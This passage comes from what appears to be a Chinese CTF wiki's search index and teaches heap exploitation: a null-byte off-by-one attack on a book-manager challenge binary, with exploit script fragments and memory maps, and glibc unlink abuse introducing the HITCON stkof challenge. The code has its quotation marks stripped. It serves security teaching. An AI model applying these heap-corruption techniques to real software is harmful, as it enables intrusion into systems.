            "text": "\u9898\u76ee\u662f\u4e00\u4e2a\u5e38\u89c1\u7684\u9009\u5355\u5f0f\u7a0b\u5e8f\uff0c\u529f\u80fd\u662f\u4e00\u4e2a\u56fe\u4e66\u7ba1\u7406\u7cfb\u7edf\u3002  1. Create a book\n2. Delete a book\n3. Edit a book\n4. Print book detail\n5. Change current author name\n6. Exit  \u7a0b\u5e8f\u63d0\u4f9b\u4e86\u521b\u5efa\u3001\u5220\u9664\u3001\u7f16\u8f91\u3001\u6253\u5370\u56fe\u4e66\u7684\u529f\u80fd\u3002\u9898\u76ee\u662f64\u4f4d\u7a0b\u5e8f\uff0c\u4fdd\u62a4\u5982\u4e0b\u6240\u793a\u3002  Canary                        : No\nNX                            : Yes\nPIE                           : Yes\nFortify                       : No\nRelRO                         : Full  \u7a0b\u5e8f\u6bcf\u521b\u5efa\u4e00\u4e2abook\u4f1a\u5206\u914d0x20\u5b57\u8282\u7684\u7ed3\u6784\u6765\u7ef4\u62a4\u5b83\u7684\u4fe1\u606f  struct book\n{\n    int id;\n    char *name;\n    char *description;\n    int size;\n}", 
            "title": "\u9898\u76ee\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#create", 
            "text": "book\u7ed3\u6784\u4e2d\u5b58\u5728name\u548cdescription\uff0cname\u548cdescription\u5728\u5806\u4e0a\u5206\u914d\u3002\u9996\u5148\u5206\u914dname buffer\uff0c\u4f7f\u7528malloc\uff0c\u5927\u5c0f\u81ea\u5b9a\u4f46\u5c0f\u4e8e32\u3002  printf( \\nEnter book name size:  , *(_QWORD *) size);\n__isoc99_scanf( %d ,  size);\nprintf( Enter book name (Max 32 chars):  ,  size);\nptr = malloc(size);  \u4e4b\u540e\u5206\u914ddescription\uff0c\u540c\u6837\u5927\u5c0f\u81ea\u5b9a\u4f46\u65e0\u9650\u5236\u3002  printf( \\nEnter book description size:  , *(_QWORD *) size);\n        __isoc99_scanf( %d ,  size);\n\nv5 = malloc(size);  \u4e4b\u540e\u5206\u914dbook\u7ed3\u6784\u7684\u5185\u5b58  book = malloc(0x20uLL);\nif ( book )\n{\n    *((_DWORD *)book + 6) = size;\n    *((_QWORD *)off_202010 + v2) = book;\n    *((_QWORD *)book + 2) = description;\n    *((_QWORD *)book + 1) = name;\n    *(_DWORD *)book = ++unk_202024;\n    return 0LL;\n}", 
            "title": "create"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_11", 
            "text": "\u7a0b\u5e8f\u7f16\u5199\u7684read\u51fd\u6570\u5b58\u5728null byte off-by-one\u6f0f\u6d1e\uff0c\u4ed4\u7ec6\u89c2\u5bdf\u8fd9\u4e2aread\u51fd\u6570\u53ef\u4ee5\u53d1\u73b0\u5bf9\u4e8e\u8fb9\u754c\u7684\u8003\u8651\u662f\u4e0d\u5f53\u7684\u3002  signed __int64 __fastcall my_read(_BYTE *ptr, int number)\n{\n  int i; // [rsp+14h] [rbp-Ch]\n  _BYTE *buf; // [rsp+18h] [rbp-8h]\n\n  if ( number  = 0 )\n    return 0LL;\n  buf = ptr;\n  for ( i = 0; ; ++i )\n  {\n    if ( (unsigned int)read(0, buf, 1uLL) != 1 )\n      return 1LL;\n    if ( *buf ==  \\n  )\n      break;\n    ++buf;\n    if ( i == number )\n      break;\n  }\n  *buf = 0;\n  return 0LL;\n}", 
            "title": "\u6f0f\u6d1e"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_12", 
            "text": "", 
            "title": "\u5229\u7528"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#1_1", 
            "text": "\u56e0\u4e3a\u7a0b\u5e8f\u4e2d\u7684my_read\u51fd\u6570\u5b58\u5728null byte off-by-one\uff0c\u4e8b\u5b9e\u4e0amy_read\u8bfb\u5165\u7684\u7ed3\u675f\u7b26'\\x00'\u662f\u5199\u5165\u52300x555555756060\u7684\u4f4d\u7f6e\u7684\u3002\u8fd9\u6837\u5f530x555555756060\uff5e0x555555756068\u5199\u5165book\u6307\u9488\u65f6\u5c31\u4f1a\u8986\u76d6\u6389\u7ed3\u675f\u7b26'\\x00'\uff0c\u6240\u4ee5\u8fd9\u91cc\u662f\u5b58\u5728\u4e00\u4e2a\u5730\u5740\u6cc4\u6f0f\u7684\u6f0f\u6d1e\u3002\u901a\u8fc7\u6253\u5370author name\u5c31\u53ef\u4ee5\u83b7\u5f97pointer array\u4e2d\u7b2c\u4e00\u9879\u7684\u503c\u3002  0x555555756040: 0x6161616161616161  0x6161616161616161\n0x555555756050: 0x6161616161616161  0x6161616161616161    == author name\n0x555555756060: 0x0000555555757480  == pointer array    0x0000000000000000\n0x555555756070: 0x0000000000000000  0x0000000000000000\n0x555555756080: 0x0000000000000000  0x0000000000000000  \u4e3a\u4e86\u5b9e\u73b0\u6cc4\u6f0f\uff0c\u9996\u5148\u5728author name\u4e2d\u9700\u8981\u8f93\u516532\u4e2a\u5b57\u8282\u6765\u4f7f\u5f97\u7ed3\u675f\u7b26\u88ab\u8986\u76d6\u6389\u3002\u4e4b\u540e\u6211\u4eec\u521b\u5efabook1\uff0c\u8fd9\u4e2abook1\u7684\u6307\u9488\u4f1a\u8986\u76d6  def js(str):\n     return io.recvuntil(str)\n\ndef jsn(num):\n     return io.recvn(num)\n\ndef fs(str):\n     io.sendline(str)\n\ndef fsn(str):\n     io.send(str)\n\njs( Enter author name: ) #input author name\nfs( a *32)\n\njs( )# create book1\nfs( 1 )\njs( Enter book name size: )\nfs( 32 )\njs( Enter book name (Max 32 chars): )\nfs( object1 )\njs( Enter book description size: )\nfs( 32 )\njs( Enter book description: )\nfs( object1 )\n\njs( )# print book1\nfs( 4 )\njs( Author: )\njs( aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ) #  == leak book1\nbook1_addr=jsn(6)\nbook1_addr=book1_addr.ljust(8, \\x00 )\nbook1_addr=u64(book1_addr)", 
            "title": "1.\u6cc4\u6f0f"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#2off-by-one", 
            "text": "\u7a0b\u5e8f\u4e2d\u540c\u6837\u63d0\u4f9b\u4e86\u4e00\u79cdchange\u529f\u80fd\uff0cchange\u529f\u80fd\u7528\u4e8e\u4fee\u6539author name\uff0c\u6240\u4ee5\u901a\u8fc7change\u53ef\u4ee5\u5199\u5165author name\uff0c\u5229\u7528off-by-one\u8986\u76d6pointer array\u7b2c\u4e00\u4e2a\u9879\u7684\u4f4e\u5b57\u8282\u3002  \u8986\u76d6\u6389book1\u6307\u9488\u7684\u4f4e\u5b57\u8282\u540e\uff0c\u8fd9\u4e2a\u6307\u9488\u4f1a\u6307\u5411book1\u7684description\uff0c\u7531\u4e8e\u7a0b\u5e8f\u63d0\u4f9b\u4e86edit\u529f\u80fd\u53ef\u4ee5\u4efb\u610f\u4fee\u6539description\u4e2d\u7684\u5185\u5bb9\u3002\u6211\u4eec\u53ef\u4ee5\u63d0\u524d\u5728description\u4e2d\u5e03\u7f6e\u6570\u636e\u4f2a\u9020\u6210\u4e00\u4e2abook\u7ed3\u6784\uff0c\u8fd9\u4e2abook\u7ed3\u6784\u7684description\u548cname\u6307\u9488\u53ef\u4ee5\u7531\u76f4\u63a5\u63a7\u5236\u3002  def off_by_one(addr):\n    addr+=58\n    js( )# create fake book in description\n    fs( 3 )\n    fake_book_data=p64(0x1)+p64(addr)+p64(addr)+pack(0xffff) \n    js( Enter new book description: )\n    fs(fake_book_data)      #  == fake book\n\n\n    js( )# change author name\n    fs( 5 )\n    js( Enter author name: )\n    fs( a *32)          #  == off-by-one  \u8fd9\u91cc\u5728description\u4e2d\u4f2a\u9020\u4e86book\uff0c\u4f7f\u7528\u7684\u6570\u636e\u662fp64(0x1)+p64(addr)+p64(addr)+pack(0xffff)\u3002\n\u5176\u4e2daddr+58\u662f\u4e3a\u4e86\u4f7f\u6307\u9488\u6307\u5411book2\u7684\u6307\u9488\u5730\u5740\uff0c\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u4efb\u610f\u4fee\u6539\u8fd9\u4e9b\u6307\u9488\u503c\u3002", 
            "title": "2.off-by-one\u8986\u76d6\u6307\u9488\u4f4e\u5b57\u8282"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#3", 
            "text": "\u901a\u8fc7\u524d\u97622\u90e8\u5206\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97\u4e86\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7684\u80fd\u529b\uff0c\u8bfb\u8005\u8bfb\u5230\u8fd9\u91cc\u53ef\u80fd\u4f1a\u89c9\u5f97\u4e0b\u9762\u7684\u64cd\u4f5c\u662f\u663e\u800c\u6613\u89c1\u7684\uff0c\u6bd4\u5982\u5199got\u8868\u52ab\u6301\u6d41\u7a0b\u6216\u8005\u5199__malloc_hook\u52ab\u6301\u6d41\u7a0b\u7b49\u3002\u4f46\u662f\u8fd9\u4e2a\u9898\u76ee\u7279\u6b8a\u4e4b\u5904\u5728\u4e8e\u5f00\u542fPIE\u5e76\u4e14\u6ca1\u6709\u6cc4\u6f0flibc\u57fa\u5730\u5740\u7684\u65b9\u6cd5\uff0c\u56e0\u6b64\u6211\u4eec\u8fd8\u9700\u8981\u60f3\u4e00\u4e0b\u5176\u4ed6\u7684\u529e\u6cd5\u3002  \u8fd9\u9053\u9898\u7684\u5de7\u5999\u4e4b\u5904\u5728\u4e8e\u5728\u5206\u914d\u7b2c\u4e8c\u4e2abook\u65f6\uff0c\u4f7f\u7528\u4e00\u4e2a\u5f88\u5927\u7684\u5c3a\u5bf8\uff0c\u4f7f\u5f97\u5806\u4ee5mmap\u6a21\u5f0f\u8fdb\u884c\u62d3\u5c55\u3002\u6211\u4eec\u77e5\u9053\u5806\u6709\u4e24\u79cd\u62d3\u5c55\u65b9\u5f0f\u4e00\u79cd\u662fbrk\u4f1a\u76f4\u63a5\u62d3\u5c55\u539f\u6765\u7684\u5806\uff0c\u53e6\u4e00\u79cd\u662fmmap\u4f1a\u5355\u72ec\u6620\u5c04\u4e00\u5757\u5185\u5b58\u3002  \u5728\u8fd9\u91cc\u6211\u4eec\u7533\u8bf7\u4e00\u4e2a\u8d85\u5927\u7684\u5757\uff0c\u6765\u4f7f\u7528mmap\u6269\u5c55\u5185\u5b58\u3002\u56e0\u4e3ammap\u5206\u914d\u7684\u5185\u5b58\u4e0elibc\u4e4b\u524d\u5b58\u5728\u56fa\u5b9a\u7684\u504f\u79fb\u56e0\u6b64\u53ef\u4ee5\u63a8\u7b97\u51falibc\u7684\u57fa\u5730\u5740\u3002 Start              End                Offset             Perm Path\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/123/123\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/123/123\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/123/123\n0x00007f8d638a3000 0x00007f8d63a63000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f8d63a63000 0x00007f8d63c63000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f8d63c63000 0x00007f8d63c67000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f8d63c67000 0x00007f8d63c69000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f8d63c69000 0x00007f8d63c6d000 0x0000000000000000 rw- \n0x00007f8d63c6d000 0x00007f8d63c93000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f8d63e54000 0x00007f8d63e79000 0x0000000000000000 rw-  === mmap\n0x00007f8d63e92000 0x00007f8d63e93000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f8d63e93000 0x00007f8d63e94000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f8d63e94000 0x00007f8d63e95000 0x0000000000000000 rw- \n0x00007ffdc4f12000 0x00007ffdc4f33000 0x0000000000000000 rw- [stack]\n0x00007ffdc4f7a000 0x00007ffdc4f7d000 0x0000000000000000 r-- [vvar]\n0x00007ffdc4f7d000 0x00007ffdc4f7f000 0x0000000000000000 r-x [vdso]\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]  Start              End                Offset             Perm Path\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/123/123\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/123/123\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/123/123\n0x00007f6572703000 0x00007f65728c3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f65728c3000 0x00007f6572ac3000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f6572ac3000 0x00007f6572ac7000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f6572ac7000 0x00007f6572ac9000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f6572ac9000 0x00007f6572acd000 0x0000000000000000 rw- \n0x00007f6572acd000 0x00007f6572af3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f6572cb4000 0x00007f6572cd9000 0x0000000000000000 rw-  === mmap\n0x00007f6572cf2000 0x00007f6572cf3000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f6572cf3000 0x00007f6572cf4000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f6572cf4000 0x00007f6572cf5000 0x0000000000000000 rw- \n0x00007fffec566000 0x00007fffec587000 0x0000000000000000 rw- [stack]\n0x00007fffec59c000 0x00007fffec59f000 0x0000000000000000 r-- [vvar]\n0x00007fffec59f000 0x00007fffec5a1000 0x0000000000000000 r-x [vdso]\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]", 
            "title": "3.\u901a\u8fc7\u6808\u5b9e\u73b0\u5229\u7528"
        }, 
        {
            "location": "/pwn/heap/unlink/", 
            "text": "Unlink\n\n\n\u539f\u7406\n\n\n\u6211\u4eec\u5728\u5229\u7528 unlink \u6240\u9020\u6210\u7684\u6f0f\u6d1e\u65f6\uff0c\u5176\u5b9e\u5c31\u662f\u5bf9\u8fdb\u884c unlink chunk \u8fdb\u884c\u5185\u5b58\u5e03\u5c40\uff0c\u7136\u540e\u501f\u52a9 unlink \u64cd\u4f5c\u6765\u8fbe\u6210\u4fee\u6539\u6307\u9488\u7684\u6548\u679c\u3002\n\n\n\u6211\u4eec\u5148\u6765\u7b80\u5355\u56de\u987e\u4e00\u4e0b unlink \u7684\u76ee\u7684\u4e0e\u8fc7\u7a0b\uff0c\u5176\u76ee\u7684\u662f\u628a\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\u4e2d\u7684\u7a7a\u95f2\u5757\u62ff\u51fa\u6765\uff0c\u7136\u540e\u548c\u76ee\u524d\u7269\u7406\u76f8\u90bb\u7684 free chunk \u8fdb\u884c\u5408\u5e76\u3002\u5176\u57fa\u672c\u7684\u8fc7\u7a0b\u5982\u4e0b\n\n\n\n\n\u4e0b\u9762\u6211\u4eec\u9996\u5148\u4ecb\u7ecd\u4e00\u4e0b unlink \u6700\u521d\u6ca1\u6709\u9632\u62a4\u65f6\u7684\u5229\u7528\u65b9\u6cd5\uff0c\u7136\u540e\u4ecb\u7ecd\u76ee\u524d\u5229\u7528 unlink \u7684\u65b9\u5f0f\u3002\n\n\n\u53e4\u8001\u7684 unlink\n\n\n\u5728\u6700\u521d unlink \u5b9e\u73b0\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u662f\u6ca1\u6709\u5bf9\u53cc\u5411\u94fe\u8868\u68c0\u67e5\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6ca1\u6709\u4ee5\u4e0b\u7684\u4ee3\u7801\u3002\n\n\n// \u7531\u4e8eP\u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002\n\n\nif\n \n(\n__builtin_expect\n \n(\nchunksize\n(\nP\n)\n \n!=\n \nprev_size\n \n(\nnext_chunk\n(\nP\n)),\n \n0\n))\n      \\\n      \nmalloc_printerr\n \n(\ncorrupted size vs. prev_size\n);\n               \\\n\n// fd bk\n\n\nif\n \n(\n__builtin_expect\n \n(\nFD\n-\nbk\n \n!=\n \nP\n \n||\n \nBK\n-\nfd\n \n!=\n \nP\n,\n \n0\n))\n                      \\\n  \nmalloc_printerr\n \n(\ncheck_action\n,\n \ncorrupted double-linked list\n,\n \nP\n,\n \nAV\n);\n  \\\n\n  \n// next_size related\n\n              \nif\n \n(\n__builtin_expect\n \n(\nP\n-\nfd_nextsize\n-\nbk_nextsize\n \n!=\n \nP\n,\n \n0\n)\n              \\\n                \n||\n \n__builtin_expect\n \n(\nP\n-\nbk_nextsize\n-\nfd_nextsize\n \n!=\n \nP\n,\n \n0\n))\n    \\\n              \nmalloc_printerr\n \n(\ncheck_action\n,\n                                      \\\n                               \ncorrupted double-linked list (not small)\n,\n    \\\n                               \nP\n,\n \nAV\n);\n   \n\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u4e3a\u4f8b\n\uff0c\u5047\u8bbe\u5806\u5185\u5b58\u6700\u521d\u7684\u5e03\u5c40\u662f\u4e0b\u9762\u7684\u6837\u5b50\n\n\n\n\n\u90a3\u4e48\u5982\u679c\u6211\u4eec\u901a\u8fc7\u67d0\u79cd\u65b9\u5f0f\uff08\n\u6bd4\u5982\u6ea2\u51fa\n\uff09\u5c06 Nextchunk \u7684 fd \u548c bk \u6307\u9488\u4fee\u6539\u4e3a\u6307\u5b9a\u7684\u503c\u3002\u5219\u5f53\u6211\u4eecfree(Q)\u65f6\n\n\n\n\nglibc \u5224\u65ad\u8fd9\u4e2a\u5757\u662f small chunk\u3002\n\n\n\u5224\u65ad\u524d\u5411\u5408\u5e76\uff0c\u53d1\u73b0\u524d\u4e00\u4e2a chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u4e0d\u9700\u8981\u524d\u5411\u5408\u5e76\u3002\n\n\n\u5224\u65ad\u540e\u5411\u5408\u5e76\uff0c\u53d1\u73b0\u540e\u4e00\u4e2a chunk \u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\uff0c\u9700\u8981\u5408\u5e76\u3002\n\n\n\u7ee7\u800c\u5bf9 nextchunk \u91c7\u53d6 unlink \u64cd\u4f5c\u3002\n\n\n\n\n\u90a3\u4e48 unlink \u5177\u4f53\u6267\u884c\u7684\u6548\u679c\u662f\u4ec0\u4e48\u6837\u5b50\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u6765\u5206\u6790\u4e00\u4e0b\n\n\n\n\nFD=P-\nfd = target addr -12\n\n\nBK=P-\nbk = expect value\n\n\nFD-\nbk = BK\uff0c\u5373 *(target addr-12+12)=BK=expect value\n\n\nBK-\nfd = FD\uff0c\u5373*(expect value +8) = FD = target addr-12\n\n\n\n\n\u770b\u8d77\u6765\u6211\u4eec\u4f3c\u4e4e\u53ef\u4ee5\u901a\u8fc7 unlink \u76f4\u63a5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7684\u76ee\u7684\uff0c\u4f46\u662f\u6211\u4eec\u8fd8\u662f\u9700\u8981\u786e\u4fdd expect value +8 \u5730\u5740\u5177\u6709\u53ef\u5199\u7684\u6743\u9650\u3002\n\n\n\u6bd4\u5982\u8bf4\u6211\u4eec\u5c06 target addr \u8bbe\u7f6e\u4e3a\u67d0\u4e2a got \u8868\u9879\uff0c\u90a3\u4e48\u5f53\u7a0b\u5e8f\u8c03\u7528\u5bf9\u5e94\u7684 libc \u51fd\u6570\u65f6\uff0c\u5c31\u4f1a\u76f4\u63a5\u6267\u884c\u6211\u4eec\u8bbe\u7f6e\u7684\u503c\uff08expect value\uff09\u5904\u7684\u4ee3\u7801\u3002\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cexpect value+8 \u5904\u7684\u503c\u88ab\u7834\u574f\u4e86\uff0c\u9700\u8981\u60f3\u529e\u6cd5\u7ed5\u8fc7\u3002\n\n\n\u5f53\u524d\u7684 unlink\n\n\n\u4f46\u662f\uff0c\u73b0\u5b9e\u662f\u6b8b\u9177\u7684\u3002\u3002\n\u6211\u4eec\u521a\u624d\u8003\u8651\u7684\u662f\u6ca1\u6709\u68c0\u67e5\u7684\u60c5\u51b5\uff0c\u4f46\u662f\u4e00\u65e6\u52a0\u4e0a\u68c0\u67e5\uff0c\u5c31\u6ca1\u6709\u8fd9\u4e48\u7b80\u5355\u4e86\u3002\u6211\u4eec\u770b\u4e00\u4e0b\u5bf9 fd \u548c bk \u7684\u68c0\u67e5\n\n\n// fd bk\n\n\nif\n \n(\n__builtin_expect\n \n(\nFD\n-\nbk\n \n!=\n \nP\n \n||\n \nBK\n-\nfd\n \n!=\n \nP\n,\n \n0\n))\n                      \\\n  \nmalloc_printerr\n \n(\ncheck_action\n,\n \ncorrupted double-linked list\n,\n \nP\n,\n \nAV\n);\n  \\\n\n\n\n\n\u6b64\u65f6\n\n\n\n\nFD-\nbk = target addr - 12 + 12=target_addr\n\n\nBK-\nfd = expect value + 8\n\n\n\n\n\u90a3\u4e48\u6211\u4eec\u4e0a\u9762\u6240\u5229\u7528\u7684\u4fee\u6539 GOT \u8868\u9879\u7684\u65b9\u6cd5\u5c31\u53ef\u80fd\u4e0d\u53ef\u7528\u4e86\u3002\u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u4f7f\u5f97 expect value+8 \u4ee5\u53ca target_addr \u7b49\u4e8e P\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6267\u884c\n\n\n\n\n*P= expect value = P - 8\n\n\n*P = target addr -12 = P - 12\n\n\n\n\n\u5373\u6539\u5199\u4e86\u6307\u9488 P \u7684\u5185\u5bb9\uff0c\u5c06\u5176\u6307\u5411\u4e86\u6bd4\u81ea\u5df1\u4f4e 12 \u7684\u5730\u5740\u5904\u3002\n\n\n\u800c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4f7f\u5f97\u4e24\u8005\u90fd\u6307\u5411 P\uff0c\u53ea\u9700\u8981\u5b89\u88c5\u5982\u4e0b\u65b9\u5f0f\u4fee\u6539\u5373\u53ef\n\n\n\n\n\u6211\u4eec\u4f1a\u901a\u8fc7\u4e4b\u540e\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\uff0c\u6211\u4eec\u8fd9\u6837\u7684\u4fee\u6539\u662f\u53ef\u4ee5\u8fbe\u5230\u4e00\u5b9a\u7684\u6548\u679c\u7684\u3002\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u6211\u4eec\u5e76\u6ca1\u6709\u8fdd\u80cc\u4e0b\u9762\u7684\u7ea6\u675f\u3002\n\n\n    \n// \u7531\u4e8eP\u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002\n\n    \nif\n \n(\n__builtin_expect\n \n(\nchunksize\n(\nP\n)\n \n!=\n \nprev_size\n \n(\nnext_chunk\n(\nP\n)),\n \n0\n))\n      \\\n      \nmalloc_printerr\n \n(\ncorrupted size vs. prev_size\n);\n               \\\n\n\n\n\n\u6b64\u5916\uff0c\u5176\u5b9e\u5982\u679c\u6211\u4eec\u8bbe\u7f6enext chunk \u7684 fd \u548c bk \u5747\u4e3a nextchunk \u7684\u5730\u5740\u4e5f\u662f\u53ef\u4ee5\u7ed5\u8fc7\u4e0a\u9762\u7684\u68c0\u6d4b\u7684\u3002\u4f46\u662f\u8fd9\u6837\u7684\u8bdd\uff0c\u5e76\u4e0d\u80fd\u8fbe\u5230\u4fee\u6539\u6307\u9488\u5185\u5bb9\u7684\u6548\u679c\u3002\n\n\n2014 HITCON stkof\n\n\n\u57fa\u672c\u4fe1\u606f\n\n\n\u279c  2014_hitcon_stkof git:\n(\nmaster\n)\n file stkof   \nstkof: ELF \n64\n-bit LSB executable, x86-64, version \n1\n \n(\nSYSV\n)\n, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, \nfor\n GNU/Linux \n2\n.6.32, BuildID\n[\nsha1\n]=\n4872b087443d1e52ce720d0a4007b1920f18e7b0, stripped\n\u279c  2014_hitcon_stkof git:\n(\nmaster\n)\n checksec stkof        \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unlink/2014_hitcon_stkof/stkof\n\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x400000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u662f 64 \u4f4d\u7684\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u548c NX \u4fdd\u62a4\u3002\n\n\n\u57fa\u672c\u529f\u80fd\n\n\n\u7a0b\u5e8f\u51e0\u4e4e\u5565\u8f93\u51fa\u4e5f\u6ca1\u6709\uff0c\u53ea\u80fd\u786c\u770b\u4e86\uff0c\u5927\u6982\u662f\u4e00\u4e2a\u5185\u5b58\u5206\u914d\u5668\uff0c\u5dee\u4e0d\u591a\u6709\u56db\u4e2a\u529f\u80fd\n\n\n\n\n1\uff0c\u5206\u914d\u6307\u5b9a\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u5e76\u5728bss\u6bb5\u8bb0\u5f55\u5bf9\u5e94 chunk \u7684\u6307\u9488\uff0c\u5047\u8bbe\u5176\u4e3aglobal\u3002\n\n\n2\uff0c\u6839\u636e\u6307\u5b9a\u7d22\u5f15\uff0c\u4ee5\u53ca\u6307\u5b9a\u5927\u5c0f\u5411\u6307\u5b9a\u5185\u5b58\u5904\uff0c\u8bfb\u5165\u6570\u636e\u3002\n\u53ef\u89c1\uff0c\u8fd9\u91cc\u5b58\u5728\u5806\u6ea2\u51fa\u7684\u60c5\u51b5\uff0c\u56e0\u4e3a\u8fd9\u91cc\u8bfb\u5165\u5b57\u8282\u7684\u5927\u5c0f\u662f\u7531\u6211\u4eec\u6765\u63a7\u5236\u7684\u3002\n\n\n3\uff0c\u6839\u636e\u6307\u5b9a\u7d22\u5f15\uff0c\u91ca\u653e\u5df2\u7ecf\u5206\u914d\u7684\u5185\u5b58\u5757\u3002\n\n\n4\uff0c\u8fd9\u4e2a\u529f\u80fd\u5e76\u6ca1\u6709\u4ec0\u4e48\u4e71\u7528\uff0c\u672c\u6765\u4ee5\u4e3a\u662f\u53ef\u4ee5\u8f93\u51fa\u5185\u5bb9\uff0c\u7ed3\u679c\u4ec0\u4e48\u4e5f\u6ca1\u6709\u8f93\u51fa\u3002\u3002\n\n\n\n\n\u521d\u6b65\u6d4b\u8bd5\n\n\n\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u6ca1\u6709\u8fdb\u884c setbuf \u64cd\u4f5c\uff0c\u6240\u4ee5\u5728\u6267\u884c\u8f93\u5165\u8f93\u51fa\u64cd\u4f5c\u7684\u65f6\u5019\u4f1a\u7533\u8bf7\u7f13\u51b2\u533a\u3002\u8fd9\u91cc\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u4f1a\u7533\u8bf7\u4e24\u4e2a\u7f13\u51b2\u533a\uff0c\u5206\u522b\u5927\u5c0f\u4e3a1024 \u548c 1024\u3002\u5177\u4f53\u5982\u4e0b\uff0c\u53ef\u4ee5\u8fdb\u884c\u8c03\u8bd5\u67e5\u770b\n\n\n\u521d\u6b21\u8c03\u7528 fgets \u65f6\uff0cmalloc\u4f1a\u5206\u914d\u7f13\u51b2\u533a 1024 \u5927\u5c0f\u3002\n\n\n*RAX  0x0\n*RBX  0x400\n*RCX  0x7ffff7b03c34 (__fxstat64+20) \u25c2\u2014 cmp    rax, -0x1000 /* \nH=\n */\n*RDX  0x88\n*RDI  0x400\n*RSI  0x7fffffffd860 \u25c2\u2014 0x16\n*R8   0x1\n*R9   0x0\n*R10  0x7ffff7fd2700 \u25c2\u2014 0x7ffff7fd2700\n*R11  0x246\n*R12  0xa\n*R13  0x9\n R14  0x0\n*R15  0x7ffff7dd18e0 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2288\n*RBP  0x7ffff7dd18e0 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2288\n*RSP  0x7fffffffd858 \u2014\u25b8 0x7ffff7a7a1d5 (_IO_file_doallocate+85) \u25c2\u2014 mov    rsi, rax\n*RIP  0x7ffff7a91130 (malloc) \u25c2\u2014 push   